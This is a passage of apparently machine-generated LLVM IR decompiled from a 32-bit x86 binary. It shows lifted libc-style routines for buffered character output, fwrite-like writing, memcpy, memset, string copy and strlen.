  br i1 %v11_804d021, label %dec_label_pc_804d028, label %dec_label_pc_804d023.dec_label_pc_804d025_crit_edge

dec_label_pc_804d023.dec_label_pc_804d025_crit_edge: ; preds = %dec_label_pc_804cff7, %dec_label_pc_804d023
  %v0_804d025.pre = load i32, i32* @esi, align 4
  %v1_804d025 = add i32 %v0_804d025.pre, -1
  %v8_804d025 = icmp eq i32 %v1_804d025, 0
  store i32 %v1_804d025, i32* @esi, align 4
  %v1_804d026 = icmp eq i1 %v8_804d025, false
  br i1 %v1_804d026, label %dec_label_pc_804d023.dec_label_pc_804d025_crit_edge.dec_label_pc_804cfef_crit_edge, label %dec_label_pc_804d028

dec_label_pc_804d023.dec_label_pc_804d025_crit_edge.dec_label_pc_804cfef_crit_edge: ; preds = %dec_label_pc_804d023.dec_label_pc_804d025_crit_edge
  %v0_804cfef.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804cfef

dec_label_pc_804d028:                             ; preds = %dec_label_pc_804d025.preheader, %dec_label_pc_804cff7, %dec_label_pc_804d023.dec_label_pc_804d025_crit_edge, %dec_label_pc_804d023, %dec_label_pc_804d016
  %v0_804d028 = load i32, i32* @ebx, align 4
  %v1_804d028 = load i32, i32* @edi, align 4
  %tmp = icmp ugt i32 %v0_804d028, %v1_804d028
  br i1 %tmp, label %dec_label_pc_804d02c, label %dec_label_pc_804d031

dec_label_pc_804d02c:                             ; preds = %dec_label_pc_804d028
  %v1_804d02c = inttoptr i32 %v0_804d028 to i8*
  store i8 0, i8* %v1_804d02c, align 1
  %v0_804d036.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804d033

dec_label_pc_804d031:                             ; preds = %dec_label_pc_804d028, %dec_label_pc_804d016, %dec_label_pc_804cfd4
  br label %dec_label_pc_804d033

dec_label_pc_804d033:                             ; preds = %dec_label_pc_804d02c, %dec_label_pc_804d031
  %v0_804d036 = phi i32 [ %v0_804d036.pre, %dec_label_pc_804d02c ], [ 0, %dec_label_pc_804d031 ]
  store i32 %v0_804d036, i32* %eax.global-to-local, align 4
  store i32 %v0_804cfd4, i32* @ebp, align 4
  ret i32 %v0_804d036

; uselistorder directives
  uselistorder i32 %v0_804d036, { 1, 0 }
  uselistorder i32 %v0_804d028, { 1, 0 }
  uselistorder i32 %v1_804d025, { 1, 0 }
  uselistorder i32 %v0_804d009, { 0, 2, 1 }
  uselistorder i32 %v0_804cfef, { 1, 0 }
  uselistorder label %dec_label_pc_804d033, { 1, 0 }
  uselistorder label %dec_label_pc_804d028, { 2, 3, 4, 1, 0 }
  uselistorder label %dec_label_pc_804d023.dec_label_pc_804d025_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_804cfef, { 1, 0 }
}

define i32 @function_804d040(i8 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804d040:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-9 = alloca i8, align 1
  %v0_804d040 = load i32, i32* @esi, align 4
  %v0_804d041 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v4_804d049 = sext i8 %arg1 to i32
  store i32 %v4_804d049, i32* @esi, align 4
  %v1_804d04d = add i32 %arg2, 16
  %v2_804d04d = inttoptr i32 %v1_804d04d to i32*
  %v3_804d04d = load i32, i32* %v2_804d04d, align 4
  store i32 %v3_804d04d, i32* %eax.global-to-local, align 4
  %v2_804d050 = add i32 %arg2, 28
  %v3_804d050 = inttoptr i32 %v2_804d050 to i32*
  %v4_804d050 = load i32, i32* %v3_804d050, align 4
  %v10_804d050 = icmp ult i32 %v3_804d04d, %v4_804d050
  %v1_804d053 = icmp eq i1 %v10_804d050, false
  br i1 %v1_804d053, label %dec_label_pc_804d05f, label %dec_label_pc_804d055

dec_label_pc_804d055:                             ; preds = %dec_label_pc_804d040
  store i32 %v4_804d049, i32* %edx.global-to-local, align 4
  %v3_804d057 = inttoptr i32 %v3_804d04d to i8*
  store i8 %arg1, i8* %v3_804d057, align 1
  %v0_804d059 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d059 = add i32 %v0_804d059, 1
  store i32 %v1_804d059, i32* %eax.global-to-local, align 4
  %v1_804d05a = load i32, i32* @ebx, align 4
  %v2_804d05a = add i32 %v1_804d05a, 16
  %v3_804d05a = inttoptr i32 %v2_804d05a to i32*
  store i32 %v1_804d059, i32* %v3_804d05a, align 4
  %v0_804d08a.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804d08a

dec_label_pc_804d05f:                             ; preds = %dec_label_pc_804d040
  %v1_804d05f = inttoptr i32 %arg2 to i16*
  %v2_804d05f = load i16, i16* %v1_804d05f, align 2
  %v3_804d05f = zext i16 %v2_804d05f to i32
  %v1_804d062 = and i32 %v3_804d05f, 192
  store i32 %v1_804d062, i32* %eax.global-to-local, align 4
  %v6_804d067 = icmp eq i32 %v1_804d062, 192
  br i1 %v6_804d067, label %dec_label_pc_804d082, label %dec_label_pc_804d06e

dec_label_pc_804d06e:                             ; preds = %dec_label_pc_804d05f
  %v0_804d06e = load i32, i32* @edx, align 4
  %v6_804d076 = call i32 @function_804fac0(i16* %v1_804d05f, i32 128, i32 %v0_804d06e, i32 %v0_804d06e)
  store i32 %v6_804d076, i32* %eax.global-to-local, align 4
  %v1_804d07e = icmp eq i32 %v6_804d076, 0
  %v1_804d080 = icmp eq i1 %v1_804d07e, false
  br i1 %v1_804d080, label %dec_label_pc_804d0f2, label %dec_label_pc_804d06e.dec_label_pc_804d082_crit_edge

dec_label_pc_804d06e.dec_label_pc_804d082_crit_edge: ; preds = %dec_label_pc_804d06e
  %v0_804d082.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804d082

dec_label_pc_804d082:                             ; preds = %dec_label_pc_804d06e.dec_label_pc_804d082_crit_edge, %dec_label_pc_804d05f
  %v0_804d0e5 = phi i32 [ %v0_804d082.pre, %dec_label_pc_804d06e.dec_label_pc_804d082_crit_edge ], [ %arg2, %dec_label_pc_804d05f ]
  %v1_804d082 = add i32 %v0_804d0e5, 4
  %v2_804d082 = inttoptr i32 %v1_804d082 to i32*
  %v3_804d082 = load i32, i32* %v2_804d082, align 4
  %v13_804d082 = icmp eq i32 %v3_804d082, -2
  %v1_804d086 = icmp eq i1 %v13_804d082, false
  br i1 %v1_804d086, label %dec_label_pc_804d08f, label %dec_label_pc_804d088

dec_label_pc_804d088:                             ; preds = %dec_label_pc_804d0d7, %dec_label_pc_804d0c2, %dec_label_pc_804d0bd, %dec_label_pc_804d0ac, %dec_label_pc_804d082
  %v0_804d088 = load i32, i32* @esi, align 4
  store i32 %v0_804d088, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804d08a

dec_label_pc_804d08a:                             ; preds = %dec_label_pc_804d055, %dec_label_pc_804d088
  %v0_804d08a = phi i32 [ %v0_804d08a.pre, %dec_label_pc_804d055 ], [ %v0_804d088, %dec_label_pc_804d088 ]
  %v1_804d08a = urem i32 %v0_804d08a, 256
  br label %dec_label_pc_804d0f5

dec_label_pc_804d08f:                             ; preds = %dec_label_pc_804d082
  %v1_804d08f = add i32 %v0_804d0e5, 12
  %v2_804d08f = inttoptr i32 %v1_804d08f to i32*
  %v3_804d08f = load i32, i32* %v2_804d08f, align 4
  store i32 %v3_804d08f, i32* %eax.global-to-local, align 4
  %v2_804d092 = add i32 %v0_804d0e5, 8
  %v3_804d092 = inttoptr i32 %v2_804d092 to i32*
  %v4_804d092 = load i32, i32* %v3_804d092, align 4
  %v15_804d092 = icmp eq i32 %v3_804d08f, %v4_804d092
  br i1 %v15_804d092, label %dec_label_pc_804d0d7, label %dec_label_pc_804d097

dec_label_pc_804d097:                             ; preds = %dec_label_pc_804d08f
  %v2_804d097 = add i32 %v0_804d0e5, 16
  %v3_804d097 = inttoptr i32 %v2_804d097 to i32*
  %v4_804d097 = load i32, i32* %v3_804d097, align 4
  %v15_804d097 = icmp eq i32 %v3_804d08f, %v4_804d097
  %v1_804d09a = icmp eq i1 %v15_804d097, false
  br i1 %v1_804d09a, label %dec_label_pc_804d0ac, label %dec_label_pc_804d09c

dec_label_pc_804d09c:                             ; preds = %dec_label_pc_804d097
  %v2_804d0a0 = call i32 @function_804c010(i32 %v0_804d0e5)
  store i32 %v2_804d0a0, i32* %eax.global-to-local, align 4
  %v1_804d0a8 = icmp eq i32 %v2_804d0a0, 0
  %v1_804d0aa = icmp eq i1 %v1_804d0a8, false
  br i1 %v1_804d0aa, label %dec_label_pc_804d0f2, label %dec_label_pc_804d09c.dec_label_pc_804d0ac_crit_edge

dec_label_pc_804d09c.dec_label_pc_804d0ac_crit_edge: ; preds = %dec_label_pc_804d09c
  %v0_804d0ac.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804d0ac

dec_label_pc_804d0ac:                             ; preds = %dec_label_pc_804d09c.dec_label_pc_804d0ac_crit_edge, %dec_label_pc_804d097
  %v0_804d0ac = phi i32 [ %v0_804d0ac.pre, %dec_label_pc_804d09c.dec_label_pc_804d0ac_crit_edge ], [ %v0_804d0e5, %dec_label_pc_804d097 ]
  %v1_804d0ac = add i32 %v0_804d0ac, 16
  %v2_804d0ac = inttoptr i32 %v1_804d0ac to i32*
  %v3_804d0ac = load i32, i32* %v2_804d0ac, align 4
  store i32 %v3_804d0ac, i32* %eax.global-to-local, align 4
  %v0_804d0af = load i32, i32* @esi, align 4
  store i32 %v0_804d0af, i32* %edx.global-to-local, align 4
  %v1_804d0b1 = trunc i32 %v0_804d0af to i8
  %v3_804d0b1 = inttoptr i32 %v3_804d0ac to i8*
  store i8 %v1_804d0b1, i8* %v3_804d0b1, align 1
  %v0_804d0b3 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d0b3 = add i32 %v0_804d0b3, 1
  store i32 %v1_804d0b3, i32* %eax.global-to-local, align 4
  %v0_804d0b4 = load i32, i32* @ebx, align 4
  %v1_804d0b4 = add i32 %v0_804d0b4, 1
  %v2_804d0b4 = inttoptr i32 %v1_804d0b4 to i8*
  %v3_804d0b4 = load i8, i8* %v2_804d0b4, align 1
  %v4_804d0b4 = urem i8 %v3_804d0b4, 2
  %v5_804d0b4 = icmp eq i8 %v4_804d0b4, 0
  %v2_804d0b8 = add i32 %v0_804d0b4, 16
  %v3_804d0b8 = inttoptr i32 %v2_804d0b8 to i32*
  store i32 %v1_804d0b3, i32* %v3_804d0b8, align 4
  br i1 %v5_804d0b4, label %dec_label_pc_804d088, label %dec_label_pc_804d0bd

dec_label_pc_804d0bd:                             ; preds = %dec_label_pc_804d0ac
  %v0_804d0bd = load i32, i32* %edx.global-to-local, align 4
  %v1_804d0bd = trunc i32 %v0_804d0bd to i8
  %v10_804d0bd = icmp eq i8 %v1_804d0bd, 10
  %v1_804d0c0 = icmp eq i1 %v10_804d0bd, false
  br i1 %v1_804d0c0, label %dec_label_pc_804d088, label %dec_label_pc_804d0c2

dec_label_pc_804d0c2:                             ; preds = %dec_label_pc_804d0bd
  %v0_804d0c5 = load i32, i32* @ebx, align 4
  %v2_804d0c6 = call i32 @function_804c010(i32 %v0_804d0c5)
  store i32 %v2_804d0c6, i32* %eax.global-to-local, align 4
  %v1_804d0ce = icmp eq i32 %v2_804d0c6, 0
  br i1 %v1_804d0ce, label %dec_label_pc_804d088, label %dec_label_pc_804d0d2

dec_label_pc_804d0d2:                             ; preds = %dec_label_pc_804d0c2
  %v0_804d0d2 = load i32, i32* @ebx, align 4
  %v1_804d0d2 = add i32 %v0_804d0d2, 16
  %v2_804d0d2 = inttoptr i32 %v1_804d0d2 to i32*
  %v3_804d0d2 = load i32, i32* %v2_804d0d2, align 4
  %v4_804d0d2 = add i32 %v3_804d0d2, -1
  store i32 %v4_804d0d2, i32* %v2_804d0d2, align 4
  br label %dec_label_pc_804d0f2

dec_label_pc_804d0d7:                             ; preds = %dec_label_pc_804d08f
  %v0_804d0d7 = load i32, i32* @esi, align 4
  store i32 %v0_804d0d7, i32* @ecx, align 4
  %v6_804d0d9 = trunc i32 %v0_804d0d7 to i8
  store i8 %v6_804d0d9, i8* %stack_var_-9, align 1
  %v2_804d0e0 = ptrtoint i8* %stack_var_-9 to i32
  store i32 %v2_804d0e0, i32* %eax.global-to-local, align 4
  %v5_804d0e5 = inttoptr i32 %v0_804d0e5 to i16*
  %v6_804d0e6 = call i32 @function_804f954(i16* %v5_804d0e5, i32 %v2_804d0e0, i32 1, i32 %v3_804d08f)
  store i32 %v6_804d0e6, i32* %eax.global-to-local, align 4
  %v1_804d0ee = icmp eq i32 %v6_804d0e6, 0
  %v1_804d0f0 = icmp eq i1 %v1_804d0ee, false
  br i1 %v1_804d0f0, label %dec_label_pc_804d088, label %dec_label_pc_804d0f2

dec_label_pc_804d0f2:                             ; preds = %dec_label_pc_804d0d7, %dec_label_pc_804d09c, %dec_label_pc_804d06e, %dec_label_pc_804d0d2
  br label %dec_label_pc_804d0f5

dec_label_pc_804d0f5:                             ; preds = %dec_label_pc_804d08a, %dec_label_pc_804d0f2
  %storemerge = phi i32 [ %v1_804d08a, %dec_label_pc_804d08a ], [ -1, %dec_label_pc_804d0f2 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_804d041, i32* @ebx, align 4
  store i32 %v0_804d040, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_804d08f, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804d0e5, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32* %eax.global-to-local, { 13, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_804d0f5, { 1, 0 }
  uselistorder label %dec_label_pc_804d0f2, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_804d08a, { 1, 0 }
}

define i32 @function_804d0fc() local_unnamed_addr {
dec_label_pc_804d0fc:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_804d0fc = load i32, i32* @esi, align 4
  %v0_804d0fd = load i32, i32* @ebx, align 4
  store i32 %v0_804d0fd, i32* %stack_var_-8, align 4
  store i32 %tmp1, i32* @ebx, align 4
  %v1_804d106 = inttoptr i32 %tmp1 to i8*
  %v2_804d106 = call i32 @function_804d204(i8* %v1_804d106)
  store i32 %v2_804d106, i32* @esi, align 4
  %v0_804d117 = load i32, i32* @ebx, align 4
  %v5_804d118 = call i32 @function_804d130(i32 %v0_804d117, i64 1, i32 %v2_804d106, i32 %tmp)
  %v1_804d122 = load i32, i32* @esi, align 4
  %v12_804d122 = icmp eq i32 %v5_804d118, %v1_804d122
  %v3_804d124 = select i1 %v12_804d122, i32 %v5_804d118, i32 -1
  %v2_804d12a = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804d12a, i32* @ebx, align 4
  store i32 %v0_804d0fc, i32* @esi, align 4
  ret i32 %v3_804d124

; uselistorder directives
  uselistorder i32 %v5_804d118, { 1, 0 }
  uselistorder i32 %tmp1, { 1, 0 }
}

define i32 @function_804d130(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804d130:
  %stack_var_-28 = alloca i32, align 4
  %v0_804d130 = load i32, i32* @edi, align 4
  %v0_804d131 = load i32, i32* @esi, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v4_804d137 = trunc i64 %arg2 to i32
  store i32 %v4_804d137, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  %v1_804d13f = inttoptr i32 %arg4 to i16*
  %v2_804d13f = load i16, i16* %v1_804d13f, align 2
  %v1_804d142 = and i16 %v2_804d13f, 192
  %v6_804d147 = icmp eq i16 %v1_804d142, 192
  br i1 %v6_804d147, label %dec_label_pc_804d162, label %dec_label_pc_804d14e

dec_label_pc_804d14e:                             ; preds = %dec_label_pc_804d130
  %v0_804d14e = load i32, i32* @edx, align 4
  store i32 %arg4, i32* %stack_var_-28, align 4
  %v6_804d156 = call i32 @function_804fac0(i16* %v1_804d13f, i32 128, i32 %v0_804d14e, i32 %v0_804d14e)
  %v1_804d15e = icmp eq i32 %v6_804d156, 0
  %v1_804d160 = icmp eq i1 %v1_804d15e, false
  br i1 %v1_804d160, label %dec_label_pc_804d1a2, label %dec_label_pc_804d162

dec_label_pc_804d162:                             ; preds = %dec_label_pc_804d14e, %dec_label_pc_804d130
  %v2_804d162 = icmp eq i32 %v4_804d137, 0
  br i1 %v2_804d162, label %dec_label_pc_804d1a2, label %dec_label_pc_804d166

dec_label_pc_804d166:                             ; preds = %dec_label_pc_804d162
  %v1_804d166 = icmp eq i32 %arg3, 0
  br i1 %v1_804d166, label %dec_label_pc_804d1a2, label %dec_label_pc_804d16a

dec_label_pc_804d16a:                             ; preds = %dec_label_pc_804d166
  %v9_804d16f = udiv i64 4294967295, %arg2
  %v10_804d16f = trunc i64 %v9_804d16f to i32
  %v6_804d173 = icmp ult i32 %v10_804d16f, %arg3
  br i1 %v6_804d173, label %dec_label_pc_804d18f, label %dec_label_pc_804d175

dec_label_pc_804d175:                             ; preds = %dec_label_pc_804d16a
  %sext = mul i64 %arg2, 4294967296
  %v2_804d178 = sdiv i64 %sext, 4294967296
  %v3_804d178 = sext i32 %arg3 to i64
  %v4_804d178 = mul nsw i64 %v3_804d178, %v2_804d178
  %v5_804d178 = trunc i64 %v4_804d178 to i32
  %v0_804d17b = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v5_804d181 = call i32 @function_804f9d4(i32 %arg1, i32 %v5_804d178, i32 %v0_804d17b, i32 %v10_804d16f)
  %v6_804d181 = sext i32 %v5_804d181 to i64
  %v10_804d18b = udiv i64 %v6_804d181, %arg2
  %v11_804d18b = trunc i64 %v10_804d18b to i32
  br label %dec_label_pc_804d1a4

dec_label_pc_804d18f:                             ; preds = %dec_label_pc_804d16a
  %v0_804d18f = load i32, i32* @ebx, align 4
  %v1_804d18f = inttoptr i32 %v0_804d18f to i32*
  %v2_804d18f = load i32, i32* %v1_804d18f, align 4
  %v1_804d191 = or i32 %v2_804d18f, 8
  %v1_804d194 = trunc i32 %v1_804d191 to i16
  %v3_804d194 = inttoptr i32 %v0_804d18f to i16*
  store i16 %v1_804d194, i16* %v3_804d194, align 2
  %v0_804d197 = load i32, i32* %stack_var_-28, align 4
  %v1_804d197 = call i32 @function_804b7f4(i32 %v0_804d197)
  %v1_804d19c = inttoptr i32 %v1_804d197 to i32*
  store i32 22, i32* %v1_804d19c, align 4
  br label %dec_label_pc_804d1a2

dec_label_pc_804d1a2:                             ; preds = %dec_label_pc_804d166, %dec_label_pc_804d162, %dec_label_pc_804d14e, %dec_label_pc_804d18f
  br label %dec_label_pc_804d1a4

dec_label_pc_804d1a4:                             ; preds = %dec_label_pc_804d175, %dec_label_pc_804d1a2
  %v0_804d1a7 = phi i32 [ %v11_804d18b, %dec_label_pc_804d175 ], [ 0, %dec_label_pc_804d1a2 ]
  store i32 %v0_804d131, i32* @esi, align 4
  store i32 %v0_804d130, i32* @edi, align 4
  ret i32 %v0_804d1a7

; uselistorder directives
  uselistorder i32 %v0_804d14e, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_804f9d4, { 5, 4, 3, 1, 0, 6, 2 }
  uselistorder i32 (i16*, i32, i32, i32)* @function_804fac0, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i64 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804d1a4, { 1, 0 }
  uselistorder label %dec_label_pc_804d1a2, { 3, 0, 1, 2 }
}

define i32 @function_804d1a8(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804d1a8:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804d1a9 = load i32, i32* @esi, align 4
  store i32 %v0_804d1a9, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_804d1aa = sdiv i32 %sext, 16777216
  store i32 %v4_804d1aa, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804d1b2 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804d1b2, i32* %edi.global-to-local, align 4
  %v2_804d1b8 = udiv i32 %v4_804d1aa, 4
  %v3_804d1bb = inttoptr i32 %arg2 to i8*
  %v4_804d1bb = bitcast i16* %arg1 to i8*
  %v5_804d1bb = call i8* @_memcpy(i8* %v4_804d1bb, i8* %v3_804d1bb, i32 %v2_804d1b8)
  %v6_804d1bb = ptrtoint i8* %v5_804d1bb to i32
  store i32 %v6_804d1bb, i32* @ecx, align 4
  %v0_804d1bd = load i32, i32* %eax.global-to-local, align 4
  %v2_804d1bd = and i32 %v0_804d1bd, 2
  %v3_804d1bd = icmp eq i32 %v2_804d1bd, 0
  br i1 %v3_804d1bd, label %dec_label_pc_804d1c3, label %dec_label_pc_804d1c1

dec_label_pc_804d1c1:                             ; preds = %dec_label_pc_804d1a8
  %v0_804d1c1 = load i32, i32* %esi.global-to-local, align 4
  %v1_804d1c1 = inttoptr i32 %v0_804d1c1 to i16*
  %v2_804d1c1 = load i16, i16* %v1_804d1c1, align 2
  %v3_804d1c1 = load i32, i32* %edi.global-to-local, align 4
  %v4_804d1c1 = inttoptr i32 %v3_804d1c1 to i16*
  store i16 %v2_804d1c1, i16* %v4_804d1c1, align 2
  %v5_804d1c1 = load i32, i32* %edi.global-to-local, align 4
  %v6_804d1c1 = load i32, i32* %esi.global-to-local, align 4
  %v7_804d1c1 = load i1, i1* @df, align 1
  %v8_804d1c1 = select i1 %v7_804d1c1, i32 -2, i32 2
  %v9_804d1c1 = add i32 %v8_804d1c1, %v5_804d1c1
  %v10_804d1c1 = add i32 %v8_804d1c1, %v6_804d1c1
  store i32 %v9_804d1c1, i32* %edi.global-to-local, align 4
  store i32 %v10_804d1c1, i32* %esi.global-to-local, align 4
  %v0_804d1c3.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d1c3

dec_label_pc_804d1c3:                             ; preds = %dec_label_pc_804d1a8, %dec_label_pc_804d1c1
  %v0_804d1c3 = phi i32 [ %v0_804d1bd, %dec_label_pc_804d1a8 ], [ %v0_804d1c3.pre, %dec_label_pc_804d1c1 ]
  %v2_804d1c3 = urem i32 %v0_804d1c3, 2
  %v3_804d1c3 = icmp eq i32 %v2_804d1c3, 0
  br i1 %v3_804d1c3, label %dec_label_pc_804d1c8, label %dec_label_pc_804d1c7

dec_label_pc_804d1c7:                             ; preds = %dec_label_pc_804d1c3
  %v0_804d1c7 = load i32, i32* %esi.global-to-local, align 4
  %v1_804d1c7 = inttoptr i32 %v0_804d1c7 to i8*
  %v2_804d1c7 = load i8, i8* %v1_804d1c7, align 1
  %v3_804d1c7 = load i32, i32* %edi.global-to-local, align 4
  %v4_804d1c7 = inttoptr i32 %v3_804d1c7 to i8*
  store i8 %v2_804d1c7, i8* %v4_804d1c7, align 1
  %v5_804d1c7 = load i32, i32* %edi.global-to-local, align 4
  %v6_804d1c7 = load i32, i32* %esi.global-to-local, align 4
  %v7_804d1c7 = load i1, i1* @df, align 1
  %v8_804d1c7 = select i1 %v7_804d1c7, i32 -1, i32 1
  %v9_804d1c7 = add i32 %v8_804d1c7, %v5_804d1c7
  %v10_804d1c7 = add i32 %v8_804d1c7, %v6_804d1c7
  store i32 %v9_804d1c7, i32* %edi.global-to-local, align 4
  store i32 %v10_804d1c7, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804d1c8

dec_label_pc_804d1c8:                             ; preds = %dec_label_pc_804d1c3, %dec_label_pc_804d1c7
  store i32 %v4_804d1b2, i32* %eax.global-to-local, align 4
  %v2_804d1cc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804d1cc, i32* @esi, align 4
  ret i32 %v4_804d1b2

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder label %dec_label_pc_804d1c8, { 1, 0 }
  uselistorder label %dec_label_pc_804d1c3, { 1, 0 }
}

define i32 @function_804d1d0(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804d1d0:
  %v0_804d1d0 = load i32, i32* @edi, align 4
  %v4_804d1d9 = ptrtoint i8* %arg1 to i32
  %v5_804d1dd = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  %v6_804d1dd = ptrtoint i8* %v5_804d1dd to i32
  store i32 %v6_804d1dd, i32* @ecx, align 4
  store i32 %v0_804d1d0, i32* @edi, align 4
  ret i32 %v4_804d1d9

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @function_804d1e8(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804d1e8:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804d1e9 = load i32, i32* @esi, align 4
  store i32 %v0_804d1e9, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804d1f1 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804d1f1, i32* %edi.global-to-local, align 4
  %v4_804d1f5.pre = load i32, i32* @eax, align 4
  %v8_804d1f5.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_804d1f5

dec_label_pc_804d1f5:                             ; preds = %dec_label_pc_804d1f5.dec_label_pc_804d1f5_crit_edge, %dec_label_pc_804d1e8
  %v2_804d1f6 = phi i32 [ %v7_804d1f6, %dec_label_pc_804d1f5.dec_label_pc_804d1f5_crit_edge ], [ %v4_804d1f1, %dec_label_pc_804d1e8 ]
  %v8_804d1f5 = phi i1 [ %v5_804d1f6, %dec_label_pc_804d1f5.dec_label_pc_804d1f5_crit_edge ], [ %v8_804d1f5.pre, %dec_label_pc_804d1e8 ]
  %v4_804d1f5 = phi i32 [ %v0_804d1f7, %dec_label_pc_804d1f5.dec_label_pc_804d1f5_crit_edge ], [ %v4_804d1f5.pre, %dec_label_pc_804d1e8 ]
  %v7_804d1f5 = phi i32 [ %v0_804d1f5.pre, %dec_label_pc_804d1f5.dec_label_pc_804d1f5_crit_edge ], [ %arg2, %dec_label_pc_804d1e8 ]
  %v1_804d1f5 = inttoptr i32 %v7_804d1f5 to i8*
  %v2_804d1f5 = load i8, i8* %v1_804d1f5, align 1
  %v3_804d1f5 = zext i8 %v2_804d1f5 to i32
  %v5_804d1f5 = and i32 %v4_804d1f5, -256
  %v6_804d1f5 = or i32 %v3_804d1f5, %v5_804d1f5
  store i32 %v6_804d1f5, i32* %eax.global-to-local, align 4
  %v9_804d1f5 = select i1 %v8_804d1f5, i32 -1, i32 1
  %v10_804d1f5 = add i32 %v7_804d1f5, %v9_804d1f5
  store i32 %v10_804d1f5, i32* %esi.global-to-local, align 4
  %v3_804d1f6 = inttoptr i32 %v2_804d1f6 to i8*
  store i8 %v2_804d1f5, i8* %v3_804d1f6, align 1
  %v4_804d1f6 = load i32, i32* %edi.global-to-local, align 4
  %v5_804d1f6 = load i1, i1* @df, align 1
  %v6_804d1f6 = select i1 %v5_804d1f6, i32 -1, i32 1
  %v7_804d1f6 = add i32 %v6_804d1f6, %v4_804d1f6
  store i32 %v7_804d1f6, i32* %edi.global-to-local, align 4
  %v0_804d1f7 = load i32, i32* %eax.global-to-local, align 4
  %v3_804d1f7 = trunc i32 %v0_804d1f7 to i8
  %v4_804d1f7 = icmp eq i8 %v3_804d1f7, 0
  %v1_804d1f9 = icmp eq i1 %v4_804d1f7, false
  br i1 %v1_804d1f9, label %dec_label_pc_804d1f5.dec_label_pc_804d1f5_crit_edge, label %dec_label_pc_804d1fb

dec_label_pc_804d1f5.dec_label_pc_804d1f5_crit_edge: ; preds = %dec_label_pc_804d1f5
  %v0_804d1f5.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804d1f5

dec_label_pc_804d1fb:                             ; preds = %dec_label_pc_804d1f5
  store i32 %v4_804d1f1, i32* %eax.global-to-local, align 4
  %v2_804d200 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804d200, i32* @esi, align 4
  ret i32 %v4_804d1f1

; uselistorder directives
  uselistorder i32 %v0_804d1f7, { 1, 0 }
  uselistorder i32 %v7_804d1f6, { 1, 0 }
  uselistorder i1 %v5_804d1f6, { 1, 0 }
  uselistorder i32 %v4_804d1f1, { 1, 2, 0, 3 }
}

define i32 @function_804d204(i8* %arg1) local_unnamed_addr {
dec_label_pc_804d204:
  %v0_804d204 = load i32, i32* @edi, align 4
  %v3_804d20e = call i32 @_strlen(i8* %arg1)
  store i32 %v3_804d20e, i32* @ecx, align 4
  store i32 %v0_804d204, i32* @edi, align 4
  ret i32 %v3_804d20e
}

define i32 @function_804d218(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804d218:
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804d219 = load i32, i32* @esi, align 4
  store i32 %v0_804d219, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804d225 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804d225, i32* %edi.global-to-local, align 4
  %v1_804d229 = add i32 %arg3, 1
